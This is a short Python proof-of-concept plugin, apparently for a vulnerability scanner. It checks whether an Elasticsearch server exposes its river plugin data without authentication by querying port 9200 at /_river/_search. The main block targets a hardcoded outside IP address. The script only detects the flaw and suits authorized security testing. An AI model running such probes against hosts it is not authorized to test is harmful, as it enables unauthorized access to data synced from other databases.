#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  : elasticsearch river 未授权访问
Author    : a
mail      :a@lcx.cc
Referer   :http://zone.wooyun.org/content/20297
elasticsearch在安装了river之后可以同步多种数据库数据
"""
def assign(service, arg):
    if service == "ip":
        return True, arg

def audit(arg):
    payload = '/_river/_search'
    url = 'http://' +arg + ':9200' + payload
    code, head, res, errcode, _ = curl.curl('"%s"' % url)
    if code == 200 and '_river' in res and 'type' in res:
        security_hole(url)
       

if __name__ == '__main__':
    from dummy import *
    audit(assign('ip', '173.164.160.131')[1])
